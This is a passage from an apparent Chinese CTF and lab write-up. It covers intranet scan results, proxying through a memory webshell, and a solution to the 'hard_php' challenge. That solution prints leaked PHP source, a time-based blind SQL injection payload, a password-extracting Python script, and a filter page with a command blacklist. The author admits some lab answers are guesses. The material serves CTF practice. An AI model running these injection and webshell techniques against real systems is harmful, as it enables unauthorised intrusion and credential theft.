[2025-07-19 10:49:54] [SERVICE] 目标:172.22.10.22 状态:identified 详情:service=redis, banner=-NOAUTH Authentication required.., port=6379
[2025-07-19 10:49:56] [SERVICE] 目标:172.22.10.88 状态:identified 详情:port=21, service=unknown
[2025-07-19 10:49:57] [SERVICE] 目标:172.22.10.22 状态:identified 详情:port=8080, service=http
[2025-07-19 10:49:57] [SERVICE] 目标:172.22.10.22 状态:identified 详情:port=8081, service=http, version=1.18.0, product=nginx, os=Linux, info=Ubuntu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>接下来是代理，测试发现靶机不通外网，且没发vps，那么只能用 NeoreGeorg 搭正向代理</p>
<p>好消息是 IWannaGetAll 里面有对应的内存马，坏消息是 IWannaGetAll 的内存马只能同时存在一种，我这里选择重置靶机然后再次打入正向代理的内存马</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">172.22.10.88:445 
172.22.10.88:18000 
172.22.10.88:135 
172.22.10.88:6648 
172.22.10.88:8088 
172.22.10.88:6080 
172.22.10.88:8101 
172.22.10.88:8100 
172.22.10.88:139 
172.22.10.88:98 
172.22.10.88:99 
172.22.10.88:9981 
172.22.10.88:21000 
172.22.10.88:21501 
172.22.10.88:28018 
172.22.10.88:443 
172.22.10.88:9998 
172.22.10.88:9999 
172.22.10.88:3306 
172.22.10.88:5432 
172.22.10.88:10000 
172.22.10.88:18098 
172.22.10.88:18001 
172.22.10.88:80 
172.22.10.88:18004 
172.22.10.88:1099 
172.22.10.88:7080 
172.22.10.88:19001 
172.22.10.88:20720 
172.22.10.88:18082 
172.22.10.88:18088 
172.22.10.88:18008 
172.22.10.88:9988 
172.22.10.88:889 
172.22.10.88:81 
172.22.10.88:8118 
172.22.10.88:6868 
172.22.10.88:1521 
172.22.10.88:1118 
172.22.10.88:20880 
172.22.10.88:10001 
172.22.10.88:2008 
172.22.10.88:1888 
172.22.10.88:6379 
172.22.10.88:8108 
172.22.10.88:21502 
172.22.10.88:8008 
172.22.10.88:8010 
172.22.10.88:20000 
172.22.10.88:18090 
172.22.10.88:18002 
172.22.10.88:7001 
172.22.10.88:2020 
172.22.10.88:8009 
172.22.10.88:2100 
172.22.10.88:7000 
172.22.10.88:8090 
172.22.10.88:8000 
172.22.10.88:10002 
172.22.10.88:8080 
172.22.10.88:9986 
172.22.10.88:7088 
172.22.10.88:18080 
172.22.10.88:1080 
172.22.10.88:8092 
172.22.10.88:7007 
172.22.10.88:10004 
172.22.10.88:3008 
172.22.10.88:1082 
172.22.10.88:7071 
172.22.10.88:3000 
172.22.10.88:27017 
172.22.10.88:1000 
172.22.10.88:84 
172.22.10.88:8093 
172.22.10.88:7003 
172.22.10.88:10250 
172.22.10.88:12443 
172.22.10.88:14000 
172.22.10.88:82 
172.22.10.88:88 
172.22.10.88:808 
172.22.10.88:87 
172.22.10.88:8089 
172.22.10.88:8053 
172.22.10.88:5555 
172.22.10.88:8161 
172.22.10.88:16080 
172.22.10.88:7070 
172.22.10.88:8094 
172.22.10.88:8030 
172.22.10.88:85 
172.22.10.88:12018 
172.22.10.88:22 
172.22.10.88:888 
172.22.10.88:2379 
172.22.10.88:89 
172.22.10.88:8880 
172.22.10.88:86 
172.22.10.88:8016 
172.22.10.88:91 
172.22.10.88:8095 
172.22.10.88:7005 
172.22.10.88:8038 
172.22.10.88:8042 
172.22.10.88:7777 
172.22.10.88:8091 
172.22.10.88:90 
172.22.10.88:7078 
172.22.10.88:8060 
172.22.10.88:8018 
172.22.10.88:8044 
172.22.10.88:7688 
172.22.10.88:9089 
172.22.10.88:8048 
172.22.10.88:801 
172.22.10.88:8020 
172.22.10.88:83 
172.22.10.88:7890 
172.22.10.88:1010 
172.22.10.88:8069 
172.22.10.88:10010 
172.22.10.88:8280 
172.22.10.88:7687 
172.22.10.88:7680 
172.22.10.88:8028 
172.22.10.88:8012 
172.22.10.88:880 
172.22.10.88:9090 
172.22.10.88:1433 
172.22.10.88:8448 
172.22.10.88:8222 
172.22.10.88:1081 
172.22.10.88:7002 
172.22.10.88:11211 
172.22.10.88:8070 
172.22.10.88:8001 
172.22.10.88:7008 
172.22.10.88:21 
172.22.10.88:8172 
172.22.10.88:2375 
172.22.10.88:3505 
172.22.10.88:8200 
172.22.10.88:8082 
172.22.10.88:7004 
172.22.10.88:800 
172.22.10.88:8181 
172.22.10.88:8046 
172.22.10.88:7200 
172.22.10.88:8003 
172.22.10.88:8011 
172.22.10.88:10008 
172.22.10.88:9000 
172.22.10.88:8180 
172.22.10.88:9200 
172.22.10.88:3128 
172.22.10.88:92 
172.22.10.88:9088 
172.22.10.88:7074 
172.22.10.88:8085 
172.22.10.88:8086 
172.22.10.88:8300 
172.22.10.88:8244 
172.22.10.88:8081 
172.22.10.88:8006 
172.22.10.88:8004 
172.22.10.88:8834 
172.22.10.88:8087 
172.22.10.88:8848 
172.22.10.88:8858 
172.22.10.88:8881 
172.22.10.88:9087 
172.22.10.88:8800 
172.22.10.88:8084 
172.22.10.88:9083 
172.22.10.88:9002 
172.22.10.88:8484 
172.22.10.88:9043 
172.22.10.88:8868 
172.22.10.88:8096 
172.22.10.88:8258 
172.22.10.88:9091 
172.22.10.88:9095 
172.22.10.88:9092 
172.22.10.88:9081 
172.22.10.88:9008 
172.22.10.88:8083 
172.22.10.88:8443 
172.22.10.88:9010 
172.22.10.88:9085 
172.22.10.88:9448 
172.22.10.88:9093 
172.22.10.88:8983 
172.22.10.88:8899 
172.22.10.88:9001 
172.22.10.88:9097 
172.22.10.88:8879 
172.22.10.88:9060 
172.22.10.88:8098 
172.22.10.88:9098 
172.22.10.88:8099 
172.22.10.88:8989 
172.22.10.88:9080 
172.22.10.88:9099 
172.22.10.88:9086 
172.22.10.88:8097 
172.22.10.88:9084 
172.22.10.88:8838 
172.22.10.88:9096 
172.22.10.88:9800 
172.22.10.88:9094 
172.22.10.88:9100 
172.22.10.88:8888 
172.22.10.88:8002 
172.22.10.88:9082 
172.22.10.88:9443 
172.22.10.88:8288 
172.22.10.88:8360 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="靶场检测项"><a href="#靶场检测项" class="headerlink" title="靶场检测项"></a>靶场检测项</h2><p>我们刚拿到shell就是root，肯定存在高权限账户。</p>
<p>我们不能ping外网，故无法连接。</p>
<p>扫到8081端口可以访问。</p>
<p>jar包内存在root&#x2F;root凭证，弱口令。</p>
<p>jar包内存在Spring相关内容，故为SpringBoot框架。</p>
<p>uname发现ubuntu。</p>
<p>我们获取shell的方式就是JDBC注入。</p>
<p>数据库管理接口无法进行未授权访问。</p>
<p>对Web02进行访问得：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> r<span class="token operator">=</span>requests<span class="token punctuation">.</span>options<span class="token punctuation">(</span><span class="token string">'http://172.22.10.88'</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Dynamic chain  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token number">172.22</span><span class="token number">.224</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">1080</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token number">172.22</span><span class="token number">.10</span><span class="token number">.88</span><span class="token punctuation">:</span><span class="token number">80</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  OK
<span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">dir</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token string">'__attrs__'</span><span class="token punctuation">,</span> <span class="token string">'__bool__'</span><span class="token punctuation">,</span> <span class="token string">'__class__'</span><span class="token punctuation">,</span> <span class="token string">'__delattr__'</span><span class="token punctuation">,</span> <span class="token string">'__dict__'</span><span class="token punctuation">,</span> <span class="token string">'__dir__'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">,</span> <span class="token string">'__enter__'</span><span class="token punctuation">,</span> <span class="token string">'__eq__'</span><span class="token punctuation">,</span> <span class="token string">'__exit__'</span><span class="token punctuation">,</span> <span class="token string">'__format__'</span><span class="token punctuation">,</span> <span class="token string">'__ge__'</span><span class="token punctuation">,</span> <span class="token string">'__getattribute__'</span><span class="token punctuation">,</span> <span class="token string">'__getstate__'</span><span class="token punctuation">,</span> <span class="token string">'__gt__'</span><span class="token punctuation">,</span> <span class="token string">'__hash__'</span><span class="token punctuation">,</span> <span class="token string">'__init__'</span><span class="token punctuation">,</span> <span class="token string">'__init_subclass__'</span><span class="token punctuation">,</span> <span class="token string">'__iter__'</span><span class="token punctuation">,</span> <span class="token string">'__le__'</span><span class="token punctuation">,</span> <span class="token string">'__lt__'</span><span class="token punctuation">,</span> <span class="token string">'__module__'</span><span class="token punctuation">,</span> <span class="token string">'__ne__'</span><span class="token punctuation">,</span> <span class="token string">'__new__'</span><span class="token punctuation">,</span> <span class="token string">'__nonzero__'</span><span class="token punctuation">,</span> <span class="token string">'__reduce__'</span><span class="token punctuation">,</span> <span class="token string">'__reduce_ex__'</span><span class="token punctuation">,</span> <span class="token string">'__repr__'</span><span class="token punctuation">,</span> <span class="token string">'__setattr__'</span><span class="token punctuation">,</span> <span class="token string">'__setstate__'</span><span class="token punctuation">,</span> <span class="token string">'__sizeof__'</span><span class="token punctuation">,</span> <span class="token string">'__str__'</span><span class="token punctuation">,</span> <span class="token string">'__subclasshook__'</span><span class="token punctuation">,</span> <span class="token string">'__weakref__'</span><span class="token punctuation">,</span> <span class="token string">'_content'</span><span class="token punctuation">,</span> <span class="token string">'_content_consumed'</span><span class="token punctuation">,</span> <span class="token string">'_next'</span><span class="token punctuation">,</span> <span class="token string">'apparent_encoding'</span><span class="token punctuation">,</span> <span class="token string">'close'</span><span class="token punctuation">,</span> <span class="token string">'connection'</span><span class="token punctuation">,</span> <span class="token string">'content'</span><span class="token punctuation">,</span> <span class="token string">'cookies'</span><span class="token punctuation">,</span> <span class="token string">'elapsed'</span><span class="token punctuation">,</span> <span class="token string">'encoding'</span><span class="token punctuation">,</span> <span class="token string">'headers'</span><span class="token punctuation">,</span> <span class="token string">'history'</span><span class="token punctuation">,</span> <span class="token string">'is_permanent_redirect'</span><span class="token punctuation">,</span> <span class="token string">'is_redirect'</span><span class="token punctuation">,</span> <span class="token string">'iter_content'</span><span class="token punctuation">,</span> <span class="token string">'iter_lines'</span><span class="token punctuation">,</span> <span class="token string">'json'</span><span class="token punctuation">,</span> <span class="token string">'links'</span><span class="token punctuation">,</span> <span class="token string">'next'</span><span class="token punctuation">,</span> <span class="token string">'ok'</span><span class="token punctuation">,</span> <span class="token string">'raise_for_status'</span><span class="token punctuation">,</span> <span class="token string">'raw'</span><span class="token punctuation">,</span> <span class="token string">'reason'</span><span class="token punctuation">,</span> <span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token string">'status_code'</span><span class="token punctuation">,</span> <span class="token string">'text'</span><span class="token punctuation">,</span> <span class="token string">'url'</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>headers
<span class="token punctuation">&#123;</span><span class="token string">'Date'</span><span class="token punctuation">:</span> <span class="token string">'Sat, 19 Jul 2025 04:38:47 GMT'</span><span class="token punctuation">,</span> <span class="token string">'Server'</span><span class="token punctuation">:</span> <span class="token string">'Apache/2.4.63 (Win64)'</span><span class="token punctuation">,</span> <span class="token string">'Content-Length'</span><span class="token punctuation">:</span> <span class="token string">'199'</span><span class="token punctuation">,</span> <span class="token string">'Keep-Alive'</span><span class="token punctuation">:</span> <span class="token string">'timeout=5, max=100'</span><span class="token punctuation">,</span> <span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'Keep-Alive'</span><span class="token punctuation">,</span> <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'text/html; charset=iso-8859-1'</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Web02的FTP可以用anonymous用户名和空密码访问。</p>
<p>下载.htaccess文件没有受到限制，故其他三个选项全错。</p>
<p>测试发现MS17-010利用失败。</p>
<p>未提到的题目为合理想象、猜测和随机选择。</p>
<h1 id="CTF-day1"><a href="#CTF-day1" class="headerlink" title="CTF-day1"></a>CTF-day1</h1><h2 id="hard-php（复现）"><a href="#hard-php（复现）" class="headerlink" title="hard_php（复现）"></a>hard_php（复现）</h2><p><a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 泄露源码</p>
<p>login.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"lib.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">alertMes</span><span class="token punctuation">(</span><span class="token variable">$mes</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>alert('<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$mes</span><span class="token punctuation">&#125;</span></span>');location.href='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$url</span><span class="token punctuation">&#125;</span></span>';&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">checkSql</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/regexp|between|replace|=|>|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|benchmark|\ /i"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">alertMes</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">''</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    
    <span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">alertMes</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'only admin can login'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">checkSql</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT password FROM users WHERE username='admin' and password='<span class="token interpolation"><span class="token variable">$password</span></span>';"</span><span class="token punctuation">;</span>
    <span class="token comment">//echo($sql);</span>
    <span class="token variable">$user_result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$user_result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//var_dump($row);</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$row</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">alertMes</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"something wrong"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> 
    <span class="token comment">//echo($row['password']);   </span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'islogin'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token function">alertMes</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"login success!!"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'admin.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token function">alertMes</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"something wrong"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">die</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>很眼熟，是<a href="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-yet-another-mysql-injection">NSSCTF web 刷题记录1 | 雲流のLowest World</a>中亦有记载的</p>
<p>不一样的地方是这里把三种方法全ban了，不能 like 布尔盲注也不能 quine 注入，更没有 phpmyadmin</p>
<p>那尝试时间盲注</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">'or/**/if(password/**/like/**/'</span>a<span class="token operator">%</span>'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment">/**/</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token comment">/**/</span><span class="token keyword">from</span><span class="token comment">/**/</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token comment">/**/</span>A<span class="token punctuation">,</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token comment">/**/</span>B<span class="token punctuation">,</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token comment">/**/</span>C<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>编写脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token punctuation">,</span>time
alp <span class="token operator">=</span> <span class="token string">"1234567890abcdefghijklmnopqrstuvwxyz~"</span>

url <span class="token operator">=</span> <span class="token string">"https://eci-2ze8pzj780kl2qmhte2x.cloudeci1.ichunqiu.com:80/login.php"</span>
flag <span class="token operator">=</span> <span class="token string">"asdahsofvhoi325890hf23094yhoas"</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> alp<span class="token punctuation">:</span>
        data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"1'or/**/if(password/**/like/**/'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token operator">+</span>i<span class="token punctuation">&#125;</span></span><span class="token string">%',(select/**/count(*)/**/from/**/information_schema.columns/**/A,information_schema.columns/**/B,information_schema.columns/**/C),0)#"</span></span><span class="token punctuation">&#125;</span>
        <span class="token comment"># print(data)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> i
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">"~"</span><span class="token punctuation">:</span>
            exit<span class="token punctuation">(</span><span class="token string">"over"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>得到密码：<code>asdahsofvhoi325890hf23094yhoasifb2</code></p>
<p>admin.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'islogin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token comment">// echo "&lt;h1 style = 'text-align: center;'>对不起，您无权访问此界面,请登陆&lt;/h1>";</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>location='./index.php';&lt;/script>"</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo "This is a test page, but as an administrator, you can see the files in the current directory&lt;/h1>";ls'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ls 列出当前目录下的文件：</p>
<p>CONST.php adca4977cb42016071530fb8888105c7.php admin.php conn.php css index.php js lib.php login.php <a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p>adca4977cb42016071530fb8888105c7.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'env'</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">blacklist</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$a</span><span class="token operator">=</span><span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$key</span><span class="token punctuation">&#125;</span></span>=<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$value</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hack!!!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">blacklist</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ls|x|cat|tac|tail|nl|f|l|a|g|more|less|head|od|vi|sort|rev|paste|file|grep|uniq|\?|\`|\~|\@|\.|\'|\"|\\\\/is'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
